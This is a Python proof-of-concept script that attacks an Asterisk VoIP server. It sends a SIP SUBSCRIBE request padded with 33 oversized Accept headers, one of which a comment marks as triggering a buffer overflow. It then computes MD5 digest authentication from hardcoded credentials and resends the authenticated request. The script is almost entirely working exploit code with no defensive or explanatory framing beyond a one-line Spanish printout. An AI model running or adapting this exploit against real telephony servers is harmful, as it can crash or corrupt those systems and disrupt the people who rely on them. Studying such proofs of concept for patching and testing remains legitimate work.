#!/usr/bin/env python
import socket
import uuid
import re
import hashlib


#Asterisk IP and port
serverIP = "192.168.171.133"
serverPort = "5060"
#Local IP
hostname = socket.gethostname()
localIP = socket.gethostbyname(hostname)
#User and passwd
user = "500"
passwd = "500"
#User to subscribe
subscribeUser = "500"
#Caller identification
callid = str(uuid.uuid4())
#Subscribe message to be sent
message = "SUBSCRIBE sip:" + subscribeUser + "@" + serverIP + ":" + serverPort + " SIP/2.0\r\n" \
        "Via: SIP/2.0/TCP " + localIP + ":21867;branch=z9hG4bKtrxftxslfcy3aagf3c9s7\r\n" \
        "From: TestUser <sip:" + user + "@" + serverIP + ":" + serverPort + ">\r\n" \
        "To: <sip:" + subscribeUser + "@" + serverIP + ":" + serverPort + ">\r\n" \
        "Call-Id: " + callid + "\r\n" \
        "CSeq: 1 SUBSCRIBE\r\n" \
        "Contact: <sip:" + user + "@" + localIP + ">\r\n"

for _ in range(32):
	message += "Accept: " + ("A" * 64) + "\r\n"
#Accept header that exploits the buffer overflow
message += "Accept: " + "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz" + "\r\n" \
        "Allow: INVITE, CANCEL, BYE, ACK, REGISTER, OPTIONS, REFER, SUBSCRIBE, NOTIFY, MESSAGE, INFO, PRACK, UPDATE\r\n" \
        "Event: message-summary\r\n" \
        "Expires: 240\r\n" \
        "Content-Length: 0\r\n" \
        "\r\n" 


#Create UDP socket
sockt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#Create the connection to Asterisk
sockt.connect((serverIP, int(serverPort)))
#Send message to asterisk
sockt.sendall(message)
#Receive data from Asterisk
receivedData = sockt.recv(10240)

#print(receivedData);

#Loop to create the Authorization Header
for line in receivedData.splitlines():
	if line.startswith("WWW-Authenticate:"):
		realmReceived = re.search("realm=\"([a-z]+)\"", line).group(1)
		nonceReceived = re.search("nonce=\"([0-9a-z\/]+)\"", line).group(1)
		r1 = hashlib.md5(user + ":" + realmReceived + ":" + passwd)
		sipUri = "sip:" + serverIP + ":" + serverPort
		r2 = hashlib.md5("SUBSCRIBE:"+ sipUri)
		response = hashlib.md5(r1.hexdigest() + ":" + nonceReceived + ":" + r2.hexdigest())
		hexResponse = response.hexdigest()

		authorizationHeader = "UPDATE \r\nAuthorization: Digest username=\"" + user + "\",uri=\"" + sipUri + "\"," \
			"nonce=\"" + nonceReceived + "\",realm=\"" + realmReceived + "\",response=\"" + hexResponse + "\",algorithm=md5"
		#Message with authorization header
		authMessage = message.replace("UPDATE", authorizationHeader)

#Send authenticated message
sockt.sendall(authMessage)

#print(authMessage)

#Print explanation
print ("Este solo envia 32 header con 'Accept: A*62' y 1 con 'Accept: ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'")
